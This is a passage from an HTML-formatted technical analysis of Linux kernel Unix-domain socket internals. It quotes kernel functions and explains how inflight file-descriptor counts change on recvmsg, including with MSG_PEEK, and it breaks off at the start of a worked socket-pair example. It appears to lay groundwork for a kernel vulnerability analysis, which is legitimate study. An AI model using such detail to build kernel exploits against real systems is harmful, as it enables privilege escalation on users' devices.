 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">static</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">void</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_detach_fds</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_cookie </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">scm</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;sk_buff </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">int</span><span class="ykcrMYlEiJ-c0">&nbsp;i</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; scm</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">fp </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;UNIXCB</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">).</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">UNIXCB</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">skb</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">).</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp </span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">=</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;NULL</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">;</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">for</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">i </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;scm</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">count</span><span class="ykcrMYlEiJ-c10">-</span><span class="ykcrMYlEiJ-c35">1</span><span class="ykcrMYlEiJ-c10">;</span><span class="ykcrMYlEiJ-c0">&nbsp;i </span><span class="ykcrMYlEiJ-c10">&gt;=</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c35">0</span><span class="ykcrMYlEiJ-c10">;</span><span class="ykcrMYlEiJ-c0">&nbsp;i</span><span class="ykcrMYlEiJ-c10">--)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unix_notinflight</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">scm</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">user</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;scm</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">[</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">i</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">]);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>The </span><span class="ykcrMYlEiJ-c3">unix_notinflight</span><span>&nbsp;from </span><span class="ykcrMYlEiJ-c3">unix_detach_fds</span><span>&nbsp;will reverse the effect of </span><span class="ykcrMYlEiJ-c3">unix_inflight</span><span class="ykcrMYlEiJ-c2">&nbsp;by decrementing the inflight count:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.d890a653a46688c713ffbe9f71996b050052c85f"></a><a id="t.14"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">void</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_notinflight</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;user_struct </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">user</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;file </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;sock </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">s </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_get_socket</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; spin_lock</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">unix_gc_lock</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">s</span><span class="ykcrMYlEiJ-c10">)</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_sock </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">u </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_sk</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">s</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; BUG_ON</span><span class="ykcrMYlEiJ-c10">(!</span><span class="ykcrMYlEiJ-c0">atomic_long_read</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">inflight</span><span class="ykcrMYlEiJ-c10">));</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; BUG_ON</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">list_empty</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">link</span><span class="ykcrMYlEiJ-c10">));</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14 ykcrMYlEiJ-c7">if</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">atomic_long_dec_and_test</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">u</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">inflight</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">))</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; list_del_init</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">u</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">link</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unix_tot_inflight</span><span class="ykcrMYlEiJ-c10">--;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10">}</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; user</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">unix_inflight</span><span class="ykcrMYlEiJ-c10">--;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; spin_unlock</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">unix_gc_lock</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Later </span><span class="ykcrMYlEiJ-c3">skb_unlink</span><span>&nbsp;and </span><span class="ykcrMYlEiJ-c3">consume_skb</span><span>&nbsp;are invoked from </span><span class="ykcrMYlEiJ-c3">unix_stream_read_generic</span><span>&nbsp;</span><span>(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/af_unix.c#L2451">af_unix.c#2451</a></span><span>)</span><span>&nbsp;to destroy the current </span><span class="ykcrMYlEiJ-c3">skb</span><span>. Following the call chain </span><span class="ykcrMYlEiJ-c3">kfree(skb)-&gt;__kfree_skb</span><span>, the kernel will invoke the function pointer </span><span class="ykcrMYlEiJ-c3">skb-&gt;destructor</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/af_unix.c#L1605">code</a></span><span>) which redirects to </span><span class="ykcrMYlEiJ-c3">unix_destruct_scm</span><span class="ykcrMYlEiJ-c2">:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.d928301c0cdf3e7a332926420806a793608d77ac"></a><a id="t.15"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">static</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">void</span><span class="ykcrMYlEiJ-c0">&nbsp;unix_destruct_scm</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;sk_buff </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_cookie scm</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; memset</span><span class="ykcrMYlEiJ-c10">(&amp;</span><span class="ykcrMYlEiJ-c0">scm</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c35">0</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c14">sizeof</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">scm</span><span class="ykcrMYlEiJ-c10">));</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; scm</span><span class="ykcrMYlEiJ-c10">.</span><span class="ykcrMYlEiJ-c0">pid &nbsp;</span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;UNIXCB</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">).</span><span class="ykcrMYlEiJ-c0">pid</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14 ykcrMYlEiJ-c7">if</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">UNIXCB</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">skb</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">).</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unix_detach_fds</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">scm</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;skb</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c23">/* Alas, it calls VFS */</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c23">/* So fscking what? fput() had been SMP-safe since the last Summer */</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; scm_destroy</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">scm</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; sock_wfree</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>In fact, the </span><span class="ykcrMYlEiJ-c3">unix_detach_fds</span><span>&nbsp;will not be invoked again here from </span><span class="ykcrMYlEiJ-c3">unix_destruct_scm</span><span>&nbsp;because </span><span class="ykcrMYlEiJ-c3">UNIXCB(skb).fp</span><span>&nbsp;is already cleared by </span><span class="ykcrMYlEiJ-c3">unix_detach_fds</span><span>. Finally, </span><span class="ykcrMYlEiJ-c3">fd_install(new_fd, get_file(fp[i]))</span><span>&nbsp;from </span><span class="ykcrMYlEiJ-c3">scm_detach_fds</span><span class="ykcrMYlEiJ-c2">&nbsp;is invoked for installing a new file descriptor.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.yfq48nayx2kg"><span>r</span><span class="ykcrMYlEiJ-c1">ecvmsg with MSG_PEEK flag</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>The </span><span class="ykcrMYlEiJ-c3">recvmsg</span><span>&nbsp;process is different i</span><span>f the </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag is set. The </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag is used during receive to &ldquo;peek&rdquo; at the message, but the data is treated as unread. </span><span class="ykcrMYlEiJ-c3">unix_stream_read_generic</span><span>&nbsp;will invoke </span><span class="ykcrMYlEiJ-c3">scm_fp_dup</span><span>&nbsp;instead of </span><span class="ykcrMYlEiJ-c3">unix_detach_fds</span><span>. </span><span>This increases the reference count of the inflight file (</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://android.googlesource.com/kernel/goldfish/+/eee65a1282369eedfcbb664d0c865a0ef3eb7017/net/unix/af_unix.c#2149">af_unix.c#2149</a></span><span>)</span><span>:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.54ddd657e781757bb7c1f32330ad770b045c0ed3"></a><a id="t.16"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">/* It is questionable, see note in unix_dgram_recvmsg.</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;*/</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14 ykcrMYlEiJ-c7">if</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">UNIXCB</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">skb</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">).</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; scm</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">.</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp </span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">=</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;scm_fp_dup</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">UNIXCB</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">skb</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">).</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">sk_peek_offset_fwd</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">sk</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;chunk</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">UNIXCB</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">).</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">break</span><span class="ykcrMYlEiJ-c10">;</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Because the data should be treated as unread, the </span><span class="ykcrMYlEiJ-c3">skb</span><span>&nbsp;is not unlinked and consumed when the </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span class="ykcrMYlEiJ-c2">&nbsp;flag is set. However, the receiver will still get a new file descriptor for the inflight socket.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.4kuedi8b9x2y"><span>recvmsg </span><span>Examples</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">Let&rsquo;s see a concrete example. Assume there are the following socket pairs:</span></p><ul style="padding: 0;" class="c27 lst-kix_k47gmg94hbw2-0 start"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span>, </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">1</span></li></ul>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2">Now, the program does the following operations:</span></p><ul style="padding: 0;" class="c27 lst-kix_8chkxhfzc2ds-0 start"><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>&nbsp;&rarr; [</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>] &rarr; </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1 </span><span>(means </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>&nbsp;sends [</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>] to </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">1</span><span class="ykcrMYlEiJ-c2">)</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="ykcrMYlEiJ-c11">0</span><span>&nbsp;&rarr; [</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span>] &rarr; </span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">1</span><span class="c11 c19 c37">1</span></li><li style="margin-left: 46pt;" class="c12 c20 c25 li-bullet-0"><span class="ykcrMYlEiJ-c8">Close</span><span class="ykcrMYlEiJ-c15">(</span><span class="ykcrMYlEiJ-c8">f </span><span class="ykcrMYlEiJ-c15">0</span><span class="ykcrMYlEiJ-c11">0</span><span class="ykcrMYlEiJ-c15">)</span></li></ul>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"></p>
